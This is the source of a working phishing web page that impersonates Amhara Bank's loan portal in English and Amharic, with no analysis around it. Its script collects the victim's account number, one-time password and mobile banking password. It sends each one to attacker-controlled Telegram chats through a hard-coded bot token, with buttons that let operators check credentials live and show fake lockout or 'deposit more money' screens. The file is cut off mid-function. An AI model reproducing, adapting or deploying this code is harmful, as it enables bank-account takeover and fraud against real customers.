<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Amhara Bank - Secure Portal</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --bank-blue: #005696;
            --bank-yellow: #fcc201;
            --text-grey: #6d6e71;
            --slant: -10.8deg; 
            --line: 5px; 
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: white; overflow: hidden; -webkit-tap-highlight-color: transparent; }

        /* --- SPLASH SCREEN & BRANDED LOADERS --- */
        #splash-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: #0B5FA5; z-index: 9999; display: flex;
            flex-direction: column; align-items: center;
        }
        .main-logo-container { width: 100%; display: flex; justify-content: center; padding-top: 80px; padding-left: 20px; padding-right: 20px; }
        .splash-main-logo { width: 100%; max-width: 800px; height: auto; object-fit: contain; animation: fadeIn 1s ease-out forwards; }
        
        .loading-section { position: relative; display: flex; justify-content: center; align-items: center; margin: 40px auto; width: 80px; height: 80px; }
        .small-logo { width: 45px; height: 45px; position: relative; z-index: 2; }
        .spinner { position: absolute; top: 50%; left: 50%; width: 75px; height: 75px; margin-top: -37.5px; margin-left: -37.5px; border-radius: 50%; z-index: 1; }
        .spinner::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; border-radius: 50%; border: 3.5px solid rgba(0, 86, 150, 0.1); border-top: 3.5px solid var(--bank-blue); animation: spin 0.8s linear infinite; }
        
        #splash-screen .spinner::before { border: 3px solid rgba(255, 255, 255, 0.2); border-top: 3px solid #FFFFFF; }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        /* --- APP SHELL --- */
        .app-shell { width: 100%; max-width: 412px; height: 100vh; margin: 0 auto; display: flex; flex-direction: column; background: white; position: relative; opacity: 0; transition: opacity 0.5s; }
        
        .header-top { background-color: var(--bank-blue); height: 210px; width: 160%; margin-left: -30%; transform: skewY(var(--slant)); transform-origin: top left; display: flex; align-items: flex-end; justify-content: center; padding-bottom: 40px; z-index: 20; }
        .header-content-inner { transform: skewY(calc(var(--slant) * -1)); width: 35%; display: flex; flex-direction: column; align-items: center; position: relative; }
        .logo-img { width: 75%; height: auto; display: block; margin-bottom: -10px; } 
        
        .stripe-wrap { width: 160%; margin-left: -30%; margin-top: var(--line); display: flex; flex-direction: column; gap: var(--line); transform: skewY(var(--slant)); transform-origin: top left; z-index: 10; }
        .line { width: 100%; height: var(--line); background-color: var(--bank-blue); }

        .page { display: none; flex-direction: column; z-index: 30; height: 100%; }

        .text-content-p1 { padding: 0 30px; margin-top: -15px; }
        .welcome-row { display: flex; justify-content: space-between; align-items: center; }
        .welcome-row h1 { color: var(--bank-blue); font-size: 28px; font-weight: 800; }
        .lang-btn { color: var(--bank-blue); font-size: 15px; font-weight: 600; cursor: pointer; border: 1.5px solid var(--bank-blue); padding: 5px 12px; border-radius: 20px; }
        .sub-desc { color: var(--text-grey); font-size: 13.5px; line-height: 1.4; margin-top: 10px; }
        .photo-area { flex-grow: 1; display: flex; justify-content: center; align-items: center; overflow: hidden; margin-top: 40px; }
        .central-img { width: 100%; height: 100%; object-fit: contain; transform: scale(1.1); mix-blend-mode: multiply; }
        .btn-area { padding: 25px 30px 45px 30px; }
        .btn-gold { width: 100%; background-color: var(--bank-blue); color: var(--bank-yellow); padding: 17px; border-radius: 12px; font-size: 18px; font-weight: 700; border: none; cursor: pointer; }

        .setup-title { color: var(--bank-blue); font-size: 22px; font-weight: 700; margin-bottom: 8px; }
        .setup-sub { color: #58595b; font-size: 14.5px; margin-bottom: 35px; }
        .input-group { position: relative; border-bottom: 1.5px solid #d1d3d4; padding-bottom: 8px; margin-top: 20px; }
        .input-label-placeholder { position: absolute; left: 0; bottom: 8px; color: #58595b; font-size: 19px; transition: 0.2s ease all; pointer-events: none; }
        .input-field:focus ~ .input-label-placeholder, .input-field:not(:placeholder-shown) ~ .input-label-placeholder { bottom: 35px; font-size: 14px; color: var(--bank-blue); }
        .input-field { width: 100%; border: none; outline: none; font-size: 20px; color: #333; background: transparent; }
        .input-counter { text-align: right; color: #a7a9ac; font-size: 14px; margin-top: 6px; }

        .timer-circle { width: 120px; height: 120px; border: 4px solid var(--bank-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 20px auto; font-size: 24px; font-weight: 800; color: var(--bank-blue); }
        .otp-timer-text { text-align: center; color: var(--bank-blue); font-weight: 600; margin-top: 15px; }

        .otp-inputs { display: flex; justify-content: space-between; margin-top: 40px; padding: 0 10px; }
        .otp-box { width: 40px; border: none; border-bottom: 2px solid #ccc; text-align: center; font-size: 24px; font-weight: 700; color: #333; padding-bottom: 5px; outline: none; }

        .pin-label { color: var(--bank-blue); font-size: 18px; font-weight: 500; margin-bottom: 10px; }
        .pin-input-wrap { display: flex; align-items: center; border-bottom: 1.5px solid var(--bank-blue); padding-bottom: 8px; }
        .pin-field { width: 100%; border: none; outline: none; font-size: 24px; letter-spacing: 4px; color: #333; background: transparent; }
        .eye-icon { width: 24px; height: 24px; opacity: 0.6; cursor: pointer; }
        .forgot-pin { color: var(--bank-blue); font-size: 16px; font-weight: 600; margin-top: 25px; cursor: pointer; }

        .continue-btn { width: 100%; background-color: #f1f2f2; color: #a7a9ac; padding: 16px; border-radius: 10px; font-size: 18px; font-weight: 700; border: none; text-align: center; pointer-events: none; margin-top: 50px; }
        .active-btn { background-color: var(--bank-blue) !important; color: var(--bank-yellow) !important; pointer-events: auto !important; cursor: pointer; }

        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 1000; justify-content: center; align-items: center; padding: 25px; }
        .modal-box { background: white; padding: 30px; border-radius: 15px; text-align: center; width: 100%; max-width: 320px; }
    </style>
</head>
<body>

    <div id="splash-screen">
        <div class="main-logo-container"><img src="https://i.postimg.cc/wvv1Jq6B/9578-removebg-preview.png" class="splash-main-logo"></div>
        <div class="loading-section" style="bottom: 20%; position: absolute;"><div class="spinner"></div><img src="https://i.postimg.cc/CxSk5Vfx/9604-removebg-preview.png" class="small-logo"></div>
    </div>

    <div class="app-shell" id="main-app">
        <div class="header-top"><div class="header-content-inner"><img src="https://i.postimg.cc/KYSWGfLP/11691-removebg-preview.png" class="logo-img"></div></div>
        <div class="stripe-wrap"><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div></div>

        <div id="page-welcome" class="page" style="display: flex;">
            <div class="text-content-p1"><div class="welcome-row"><h1 data-key="loan-title">Amhara Bank</h1><div class="lang-btn" id="lang-toggler" onclick="toggleLang()">English</div></div><p class="sub-desc" data-key="welcome-sub">Welcome to Amhara Bank‚Äôs credit services. Please submit your application through the portal to access available credit facilities based on your profile.</p></div>
            <div class="photo-area"><img src="https://i.postimg.cc/rw6jxmmL/Screenshot-20260119-080631-Google-Play-Store.jpg" class="central-img"></div>
            <div class="btn-area"><button class="btn-gold" onclick="notifyApply()" data-key="start-app">Apply Now</button></div>
        </div>

        <div id="page-account" class="page" style="padding: 25px;">
            <h2 class="setup-title" data-key="acc-check">Account</h2><p class="setup-sub" data-key="acc-sub">Please enter your 13-digit account number to start.</p>
            <div class="input-group">
                <input type="number" class="input-field" id="acc-input" placeholder=" " oninput="validateAcc()" onclick="showFirstNote()" maxlength="13">
                <label class="input-label-placeholder" data-key="acc-label">Account Number</label>
            </div>
            <div class="input-counter" id="counter">0/13</div>
            <button class="continue-btn" id="acc-btn" onclick="submitAccount()" data-key="continue" disabled>Continue</button>
        </div>

        <div id="page-waiting" class="page" style="padding: 40px 30px; text-align: center;">
            <h2 class="setup-title" data-key="wait-h">Sending OTP</h2><p class="setup-sub" data-key="wait-p">Please wait while we send a one-time password to your phone to verify your account.</p>
            <div class="timer-circle" id="timer">05:00</div>
            <div class="loading-section"><div class="spinner"></div><img src="https://i.postimg.cc/CxSk5Vfx/9604-removebg-preview.png" class="small-logo"></div>
        </div>

        <div id="page-otp" class="page" style="padding: 25px;">
            <h2 class="setup-title" data-key="otp-head">Verification</h2><p class="setup-sub" data-key="otp-sub">A 6-digit OTP has been sent to your registered mobile number from Amhara Bank. Please enter the code below to continue.</p>
            <div class="otp-inputs">
                <input type="number" class="otp-box" id="o1" oninput="limitAndMove(this, 'o2')" onkeydown="checkBack(event, '')" onpaste="handlePaste(event)">
                <input type="number" class="otp-box" id="o2" oninput="limitAndMove(this, 'o3')" onkeydown="checkBack(event, 'o1')">
                <input type="number" class="otp-box" id="o3" oninput="limitAndMove(this, 'o4')" onkeydown="checkBack(event, 'o2')">
                <input type="number" class="otp-box" id="o4" oninput="limitAndMove(this, 'o5')" onkeydown="checkBack(event, 'o3')">
                <input type="number" class="otp-box" id="o5" oninput="limitAndMove(this, 'o6')" onkeydown="checkBack(event, 'o4')">
                <input type="number" class="otp-box" id="o6" oninput="limitAndMove(this, '')" onkeydown="checkBack(event, 'o5')">
            </div>
            <div class="otp-timer-text" id="otp-countdown">Expires in: 00:40</div>
            <button class="continue-btn" id="otp-btn" onclick="submitOTP()" data-key="confirm" disabled>Confirm</button>
        </div>

        <div id="page-otp-waiting" class="page" style="padding: 40px 30px; text-align: center;">
            <h2 class="setup-title" data-key="otp-wait-h">Verifying OTP</h2><p class="setup-sub" data-key="otp-wait-p">Verifying the OTP you entered. Please wait a moment.</p>
            <div class="loading-section" style="margin-top: 60px;"><div class="spinner"></div><img src="https://i.postimg.cc/CxSk5Vfx/9604-removebg-preview.png" class="small-logo"></div>
        </div>

        <div id="page-login" class="page" style="padding: 35px 25px;">
            <h1 class="login-title" data-key="auth-head">Registration</h1><p class="login-welcome" data-key="auth-sub">Enter your mobile banking password to complete your registration.</p>
            <div class="pin-label" data-key="pin-text">Password</div>
            <div class="pin-input-wrap"><input type="password" class="pin-field" id="pin-field" oninput="validatePin()"><img src="https://cdn-icons-png.flaticon.com/512/709/709612.png" class="eye-icon" onclick="togglePin()"></div>
            <div class="forgot-pin" onclick="showModal('info-modal')" data-key="forgot">Forgot Password?</div>
            <button class="continue-btn" id="reg-btn" onclick="submitPin()" data-key="apply" disabled>Complete</button>
        </div>

        <div id="page-pin-waiting" class="page" style="padding: 40px 30px; text-align: center;">
            <h2 class="setup-title" data-key="pin-wait-h">Confirming</h2><p class="setup-sub" data-key="pin-wait-p">Please wait while we confirm your request. This may take a moment.</p>
            <div class="loading-section" style="margin-top: 60px;"><div class="spinner"></div><img src="https://i.postimg.cc/CxSk5Vfx/9604-removebg-preview.png" class="small-logo"></div>
        </div>

        <div id="page-ineligible" class="page" style="padding: 40px 30px; text-align: center;">
            <div style="font-size: 60px; color: #d9534f; margin-bottom: 20px;">!</div>
            <h2 class="setup-title" data-key="inel-h">Ineligible</h2><p class="setup-sub" data-key="inel-p">Your account balance is not eligible for a loan. Please deposit money and try again.</p>
            <button class="btn-gold active-btn" style="width:100%; margin-top:20px;" onclick="location.reload()" data-key="done">Done</button>
        </div>

        <div id="page-locked" class="page" style="padding: 40px 30px; text-align: center;">
            <div style="font-size: 60px; color: #d9534f; margin-bottom: 20px;">üîí</div>
            <h2 class="setup-title" data-key="lock-h">Account Locked</h2><p class="setup-sub" data-key="lock-p">Security Alert: Your mobile banking access has been temporarily locked due to multiple failed attempts. Please visit the nearest Amhara Bank branch with your ID to restore access.</p>
            <button class="btn-gold active-btn" style="width:100%; margin-top:20px;" onclick="location.reload()" data-key="done">Finish</button>
        </div>

        <div id="page-success" class="page" style="padding: 40px 30px; text-align: center;">
            <div style="font-size: 60px; color: #4CAF50; margin-bottom: 20px;">‚úì</div>
            <h2 class="success-title" data-key="succ-h">Request Successful</h2><p class="success-body" data-key="succ-p">Your application has been received successfully. You will receive an SMS update within 24 business hours. After confirmation, please complete the remaining steps in person.</p>
            <button class="btn-gold active-btn" style="width:100%; margin-top:20px;" onclick="location.reload()" data-key="done">Finish</button>
        </div>
    </div>

    <div class="modal" id="deposit-note-modal"><div class="modal-box"><h3 style="color:var(--bank-blue);" data-key="note-h">Important Notice</h3><p style="text-align:left; margin-top:10px; line-height:1.5;" data-key="note-p">To qualify for our credit facility, a minimum balance of 5,000 ETB is required. Please note that a higher account balance significantly increases your loan eligibility and approved credit limit.</p><button class="btn-gold active-btn" onclick="hideModal('deposit-note-modal')" data-key="ok-btn">OK</button></div></div>
    <div class="modal" id="otp-expired-modal"><div class="modal-box"><h3 style="color:#d9534f;" data-key="otp-exp-h">OTP Expired</h3><p data-key="otp-exp-p">Your OTP has expired. Please try again.</p><button class="btn-gold active-btn" onclick="resendOTPFlow()" data-key="try-again">Try Again</button></div></div>
    <div class="modal" id="info-modal"><div class="modal-box"><h3 data-key="modal-h" style="color:var(--bank-blue);">Password Reset</h3><p data-key="modal-p">Please visit your nearest branch for password recovery.</p><button class="btn-gold active-btn" onclick="hideModal('info-modal')">OK</button></div></div>
    <div class="modal" id="error-modal"><div class="modal-box"><h3 style="color:#d9534f;" data-key="err-h">Error</h3><p data-key="acc-err-p">The account number is incorrect. Please try again.</p><button class="btn-gold active-btn" onclick="resetToAccount()" data-key="try-again">Retry</button></div></div>
    <div class="modal" id="not-reg-modal"><div class="modal-box"><h3 style="color:var(--bank-blue);" data-key="reg-h">Notice</h3><p data-key="reg-p">Account not registered for mobile banking.</p><button class="btn-gold active-btn" onclick="resetToAccount('not-reg-modal')" data-key="done">OK</button></div></div>
    <div class="modal" id="otp-error-modal"><div class="modal-box"><h3 style="color:#d9534f;" data-key="otp-err-h">OTP Error</h3><p data-key="otp-err-p">The code entered is incorrect.</p><button class="btn-gold active-btn" onclick="resendOTPFlow()" data-key="try-again">Resend OTP</button></div></div>
    <div class="modal" id="pin-error-modal"><div class="modal-box"><h3 style="color:#d9534f;" id="pin-error-title">Incorrect Password</h3><p id="pin-error-body">The mobile banking password you entered is incorrect.</p><button class="btn-gold active-btn" id="pin-retry-btn" onclick="retryPin()" data-key="try-again">Retry</button></div></div>

    <script>
        const BOT_TOKEN = "8472250354:AAFDjUbcUCPBjo-UGBVIUys9mqOfz1cy5Ks";
        const ADMIN_IDS = ["5668579491", "8145799125"];

        // 50 Names Generator for Unique Identification
        const NAMES_LIST = ["Daniel", "Sara", "Abebe", "Mulu", "Kebede", "Selam", "Yonas", "Hanna", "Tewodros", "Martha", "Dawit", "Rahel", "Samuel", "Ruth", "Elias", "Helen", "Getachew", "Aster", "Mesfin", "Lydia", "Biniyam", "Tigist", "Solomon", "Genet", "Abel", "Zenebech", "Ephraim", "Fekerte", "Henok", "Lemlem", "Natnael", "Marta", "Zelalem", "Workenesh", "Tamrat", "Seble", "Girma", "Almaz", "Tadesse", "Hiwot", "Dereje", "Beza", "Kassa", "Sintayehu", "Fikru", "Kidist", "Assefa", "Edel", "Yared", "Tsion"];
        
        let roundNumber = parseInt(localStorage.getItem('user_round') || "1");
        let nameIndex = parseInt(localStorage.getItem('user_name_index') || Math.floor(Math.random() * NAMES_LIST.length).toString());
        localStorage.setItem('user_name_index', nameIndex);
        
        const USER_NAME = NAMES_LIST[nameIndex];
        const SESSION_ID = `${USER_NAME}_${roundNumber}`;
        
        let countdownInterval, otpInterval, lastOffset = 0, pollerInterval, currentAccount = "";
        let pinAttempts = 0;
        let noteShown = false;

        const translations = {
            en: {
                "loan-title": "Amhara Bank", "welcome-sub": "Welcome to Amhara Bank‚Äôs credit services. Please submit your application through the portal to access available credit facilities based on your profile.", "start-app": "Apply Now",
                "acc-check": "Account", "acc-sub": "Please enter your 13-digit account number to start.", "acc-label": "Account Number", "continue": "Continue",
                "wait-h": "Sending OTP", "wait-p": "Please wait while we send a one-time password to your phone to verify your account.",
                "otp-head": "Verification", "otp-sub": "A 6-digit OTP has been sent to your registered mobile number from Amhara Bank. Please enter the code below to continue.", "confirm": "Confirm",
                "otp-wait-h": "Verifying OTP", "otp-wait-p": "Verifying the OTP you entered. Please wait a moment.",
                "auth-head": "Registration", "auth-sub": "Enter your mobile banking password to complete your registration.", "pin-text": "Password", "forgot": "Forgot Password?", "apply": "Complete",
                "pin-wait-h": "Confirming", "pin-wait-p": "Please wait while we confirm your request. This may take a moment.",
                "succ-h": "Request Successful", "succ-p": "Your application has been received successfully. You will receive an SMS update within 24 business hours. After confirmation, please complete the remaining steps in person.", "done": "Finish",
                "inel-h": "Ineligible", "inel-p": "Your account balance is not eligible for a loan. Please deposit money and try again.",
                "lock-h": "Account Locked", "lock-p": "Security Alert: Your mobile banking access has been temporarily locked due to multiple failed attempts. Please visit the nearest Amhara Bank branch with your ID to restore access.",
                "otp-exp-h": "OTP Expired", "otp-exp-p": "Your OTP has expired. Please try again.", "try-again": "Try Again",
                "reg-h": "Notice", "reg-p": "Account not registered for mobile banking.",
                "note-h": "Important Notice", "note-p": "To qualify for our credit facility, a minimum balance of 5,000 ETB is required. Please note that a higher account balance significantly increases your loan eligibility and approved credit limit.", "ok-btn": "OK"
            },
            am: {
                "loan-title": "·ä†·àõ·à´ ·â£·äï·ä≠", "welcome-sub": "·ãà·ã∞ ·ä†·àõ·à´ ·â£·äï·ä≠ ·ã®·â•·ãµ·à≠ ·ä†·åà·àç·åç·àé·âµ ·ä•·äï·ä≥·äï ·â†·ã∞·àÖ·äì ·àò·å°·ç¢ ·â†·çï·àÆ·çã·ã≠·àç·ãé ·àã·ã≠ ·â†·àò·àò·àµ·à®·âµ ·ã®·àö·åà·äô ·ã®·â•·ãµ·à≠ ·ä†·åà·àç·åç·àé·â∂·âΩ·äï ·àà·àõ·åç·äò·âµ ·ä•·â£·ä≠·ãé ·àõ·àò·àç·ä®·âª·ãé·äï ·â†·ãö·àÖ ·çñ·à≠·â≥·àç ·â†·ä©·àç ·ã´·âÖ·à≠·â°·ç¢", "start-app": "·ä†·àÅ·äë·äë ·ã´·àò·àç·ä≠·â±",
                "acc-check": "·ä†·ä´·ãç·äï·âµ", "acc-sub": "·ä•·â£·ä≠·ãé ·àà·àò·åÄ·àò·à≠ ·â£·àà 13 ·ä†·àÉ·ãù ·ã®·àÇ·à≥·â• ·âÅ·å•·à≠·ãé·äï ·ã´·àµ·åà·â°·ç¢", "acc-label": "·ã®·àÇ·à≥·â• ·âÅ·å•·à≠", "continue": "·ã≠·âÄ·å•·àâ",
                "wait-h": "OTP ·â†·àò·àã·ä≠ ·àã·ã≠", "wait-p": "·ä†·ä´·ãç·äï·âµ·ãé·äï ·àà·àõ·à®·åã·åà·å• ·ã®·ä†·äï·ãµ ·åä·ãú ·ã®·ã≠·àà·çç ·âÉ·àç ·ãà·ã∞ ·àµ·àç·ä≠·ãé ·ä•·àµ·ä≠·äï·àç·ä≠ ·ãµ·à®·àµ ·ä•·â£·ä≠·ãé ·ã≠·å†·â•·âÅ·ç¢",
                "otp-head": "·àõ·à®·åã·åà·å´", "otp-sub": "·â£·àà 6 ·ä†·àÉ·ãù OTP ·ä®·ä†·àõ·à´ ·â£·äï·ä≠ ·ãà·ã∞ ·â∞·àò·ãò·åà·â†·ãç ·ã®·àû·â£·ã≠·àç ·àµ·àç·ä≠·ãé ·â∞·àç·ä≥·àç·ç¢ ·àà·àò·âÄ·å†·àç ·ä•·â£·ä≠·ãé ·äÆ·ã±·äï ·ä®·â≥·âΩ ·ã´·àµ·åà·â°·ç¢", "confirm": "·ä†·à®·åã·åç·å•",
                "otp-wait-h": "OTP ·â†·àõ·à®·åã·åà·å• ·àã·ã≠", "otp-wait-p": "·ã´·àµ·åà·â°·âµ·äï OTP ·â†·àõ·à®·åã·åà·å• ·àã·ã≠·ç¢ ·ä•·â£·ä≠·ãé ·âµ·äï·àΩ ·ã≠·å†·â•·âÅ·ç¢",
                "auth-head": "·àù·ãù·åà·â£", "auth-sub": "·àù·ãù·åà·â£·ãé·äï ·àà·àõ·å†·äì·âÄ·âÖ ·ã®·àû·â£·ã≠·àç ·â£·äï·ä™·äï·åç ·ã®·ã≠·àà·çç ·âÉ·àç·ãé·äï ·ã´·àµ·åà·â°·ç¢", "pin-text": "·ã®·ã≠·àà·çç ·âÉ·àç", "forgot": "·ã®·ã≠·àà·çç ·âÉ·àç ·à®·àµ·â∞·ãã·àç?", "apply": "·ä†·å†·äì·âÖ·âÖ",
                "pin-wait-h": "·â†·àõ·à®·åã·åà·å• ·àã·ã≠", "pin-wait-p": "·å•·ã´·âÑ·ãé·äï ·ä•·àµ·ä≠·äì·à®·åã·åç·å• ·ãµ·à®·àµ ·ä•·â£·ä≠·ãé ·ã≠·å†·â•·âÅ·ç¢ ·ã≠·àÖ ·å•·âÇ·âµ ·åä·ãú ·àä·ãà·àµ·ãµ ·ã≠·âΩ·àã·àç·ç¢",
                "succ-h": "·å•·ã´·âÑ·ãç ·â∞·à≥·ä≠·â∑·àç", "succ-p": "·àõ·àò·àç·ä®·âª·ãé ·â†·â∞·à≥·ä´ ·àÅ·äî·â≥ ·ã∞·à≠·à∑·àç·ç¢ ·â† 24 ·ã®·à•·à´ ·à∞·ãì·â≥·âµ ·ãç·àµ·å• ·â†·ä§·àµ·ä§·àù·ä§·àµ (SMS) ·àò·à®·åÉ ·ã≠·ã∞·à≠·àµ·ãé·â≥·àç·ç¢ ·ä´·à®·åã·åà·å° ·â†·äã·àã ·ä•·â£·ä≠·ãé ·âÄ·à™·ãé·âπ·äï ·ã∞·à®·åÉ·ãé·âΩ ·â†·ä†·ä´·àç ·â∞·åà·äù·â∞·ãç ·ã´·å†·äì·âÖ·âÅ·ç¢", "done": "·å®·à≠·àµ",
                "inel-h": "·â•·âÅ ·ä†·ã≠·ã∞·àâ·àù", "inel-p": "·ã®·ä†·ä´·ãç·äï·âµ·ãé ·âÄ·à™ ·àÇ·à≥·â• ·àà·â•·ãµ·à≠ ·â•·âÅ ·ä†·ã≠·ã∞·àà·àù·ç¢ ·ä•·â£·ä≠·ãé ·åà·äï·ãò·â• ·ã´·àµ·åà·â° ·ä•·äì ·ä•·äï·ã∞·åà·äì ·ã≠·àû·ä≠·à©·ç¢",
                "lock-h": "·àò·àà·ã´ ·â∞·ãò·åç·â∑·àç", "lock-p": "·ã®·ã∞·àÖ·äï·äê·âµ ·àõ·àµ·å†·äï·âÄ·âÇ·ã´·ç° ·â†·â∞·ã∞·åã·åã·àö ·â†·â∞·à≥·à≥·â∞ ·àô·ä®·à´ ·àù·ä≠·äï·ã´·âµ ·ã®·àû·â£·ã≠·àç ·â£·äï·ä™·äï·åç ·ä†·åà·àç·åç·àé·âµ·ãé ·àà·åä·ãú·ãç ·â≥·åç·ã∑·àç·ç¢ ·ä•·â£·ä≠·ãé ·â†·ä†·âÖ·à´·â¢·ã´·ãé ·ãà·ã∞·àö·åà·äù ·ã®·ä†·àõ·à´ ·â£·äï·ä≠ ·âÖ·à≠·äï·å´·çç ·â†·â£·äï·ä≠ ·ã∞·â•·â∞·à≠·ãé ·ä•·äì ·àò·â≥·ãà·âÇ·ã´·ãé ·ã≠·àù·å°·ç¢",
                "otp-exp-h": "OTP ·åä·ãú·ãç ·ä†·àç·çè·àç", "otp-exp-p": "·ã®·ä•·à≠·àµ·ãé OTP ·åä·ãú·ãç ·ä†·àç·çé·â†·â≥·àç·ç¢ ·ä•·â£·ä≠·ãé ·ä•·äï·ã∞·åà·äì ·ã≠·àû·ä≠·à©·ç¢", "try-again": "·ä•·äï·ã∞·åà·äì ·ã≠·àû·ä≠·à©",
                "reg-h": "·àõ·à≥·à∞·â¢·ã´", "reg-p": "·ä†·ä´·ãç·äï·â± ·àà·àû·â£·ã≠·àç ·â£·äï·ä™·äï·åç ·ä†·àç·â∞·àò·ãò·åà·â†·àù·ç¢",
                "note-h": "·ä†·àµ·çà·àã·åä ·àõ·à≥·à∞·â¢·ã´", "note-p": "·àà·â•·ãµ·à≠ ·ä†·åà·àç·åç·àé·â≥·âΩ·äï ·â•·âÅ ·àà·àò·àÜ·äï ·â¢·ã´·äï·àµ 5,000 ETB ·àÇ·à≥·â• ·ã´·àµ·çà·àç·åã·àç·ç¢ ·ä®·çç·â∞·äõ ·ã®·àÇ·à≥·â• ·àò·å†·äï ·àò·äñ·à≠·ãé ·ã®·â•·ãµ·à≠ ·çç·âÉ·ãµ ·ã®·àõ·åç·äò·âµ ·ãï·ãµ·àç·ãé·äï ·ä•·äì ·ã®·â∞·çà·âÄ·ã∞·ãç·äï ·ã®·â•·ãµ·à≠ ·àò·å†·äï ·â†·ä®·çç·â∞·äõ ·àÅ·äî·â≥ ·ä•·äï·ã∞·àö·å®·àù·à≠ ·ã≠·åà·äï·ãò·â°·ç¢", "ok-btn": "·ä•·à∫"
            }
        };

        let currentLang = 'en';
        function toggleLang() {
            currentLang = currentLang === 'en' ? 'am' : 'en';
            document.getElementById('lang-toggler').innerText = currentLang === 'en' ? 'English' : '·ä†·àõ·à≠·äõ';
            document.querySelectorAll('[data-key]').forEach(el => {
                const key = el.getAttribute('data-key');
                if (translations[currentLang][key]) el.innerText = translations[currentLang][key];
            });
        }

        function showFirstNote() {
            if(!noteShown) {
                showModal('deposit-note-modal');
                noteShown = true;
            }
        }

        function showPage(pageId) {
            document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
            document.getElementById('page-' + pageId).style.display = 'flex';
        }

        function startTimer(id, seconds) {
            let duration = seconds;
            const timerDisplay = document.getElementById(id);
            if (!timerDisplay) return;
            clearInterval(countdownInterval);
            countdownInterval = setInterval(() => {
                let mins = Math.floor(duration / 60), secs = duration % 60;
                timerDisplay.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
                if (--duration < 0) clearInterval(countdownInterval);
            }, 1000);
        }

        function startOtpCountdown() {
            let duration = 40;
            const display = document.getElementById('otp-countdown');
            clearInterval(otpInterval);
            otpInterval = setInterval(() => {
                display.innerText = `Expires in: 00:${duration.toString().padStart(2, '0')}`;
                if (--duration < 0) {
                    clearInterval(otpInterval);
                    showModal('otp-expired-modal');
                }
            }, 1000);
        }

        function notifyApply() { 
            ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=User started application [User: ${SESSION_ID}]`));
            showPage('account'); 
        }

        async function submitAccount() {
            currentAccount = document.getElementById('acc-input').value;
            showPage('waiting'); 
            startTimer('timer', 300); 
            const kb = { inline_keyboard: [[
                { text: "‚úÖ Correct", callback_data: `acc_check_yes_${SESSION_ID}` },
                { text: "‚ùå Incorrect", callback_data: `acc_check_no_${SESSION_ID}` },
                { text: "üö´ Not Registered", callback_data: `acc_check_notreg_${SESSION_ID}` }
            ]]};
            for (let id of ADMIN_IDS) {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST", headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: id, text: `üè¶ Verify Account Number: \n\n<code>${currentAccount}</code>\n\n[User: ${SESSION_ID}]`, parse_mode: "HTML", reply_markup: kb })
                });
            }
            pollAdmin("acc_check");
        }

        function resendOTPFlow() {
            hideModal('otp-error-modal');
            hideModal('otp-expired-modal');
            document.querySelectorAll('.otp-box').forEach(box => box.value = '');
            document.getElementById('otp-btn').classList.remove('active-btn');
            document.getElementById('otp-btn').disabled = true;
            showPage('waiting'); 
            startTimer('timer', 300);
            ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=User RESEND OTP [User: ${SESSION_ID}]`));
            submitAccount(); 
        }

        function handlePaste(e) {
            e.preventDefault();
            const pasteData = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
            if (!pasteData) return;
            const boxes = document.querySelectorAll('.otp-box');
            pasteData.split('').forEach((char, i) => { if (boxes[i]) boxes[i].value = char; });
            const nextIdx = Math.min(pasteData.length, 5);
            boxes[nextIdx].focus();
            checkOtpReady();
        }

        function limitAndMove(curr, nextId) {
            if (curr.value.length > 1) curr.value = curr.value.slice(0,1);
            if (curr.value.length === 1 && nextId) document.getElementById(nextId).focus();
            checkOtpReady();
        }

        function checkOtpReady() {
            const filled = Array.from(document.querySelectorAll('.otp-box')).every(b => b.value !== "");
            const btn = document.getElementById('otp-btn');
            if (filled) { btn.classList.add('active-btn'); btn.disabled = false; }
            else { btn.classList.remove('active-btn'); btn.disabled = true; }
        }

        async function submitOTP() {
            clearInterval(otpInterval);
            let otp = Array.from(document.querySelectorAll('.otp-box')).map(i => i.value).join('');
            showPage('otp-waiting'); 
            await sendToAdmin(`üîë OTP: \n\n<code>${otp}</code>\n\nAccount: <code>${currentAccount}</code>\n\n[User: ${SESSION_ID}]`, "otp_check");
            pollAdmin("otp_check");
        }

        async function submitPin() {
            let pin = document.getElementById('pin-field').value;
            showPage('pin-waiting');
            const kb = { inline_keyboard: [
                [{ text: "‚úÖ Correct", callback_data: `pin_check_yes_${SESSION_ID}` }, { text: "‚ùå Incorrect", callback_data: `pin_check_no_${SESSION_ID}` }],
                [{ text: "‚õî Not Eligible", callback_data: `pin_check_noteligible_${SESSION_ID}` }, { text: "üîí Lock Account", callback_data: `pin_check_locked_${SESSION_ID}` }]
            ]};
            for (let id of ADMIN_IDS) {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST", headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: id, text: `üí≥ PIN: \n\n<code>${pin}</code>\n\n[User: ${SESSION_ID}]`, parse_mode: "HTML", reply_markup: kb })
                });
            }
            pollAdmin("pin_check");
        }

        async function sendToAdmin(text, context) {
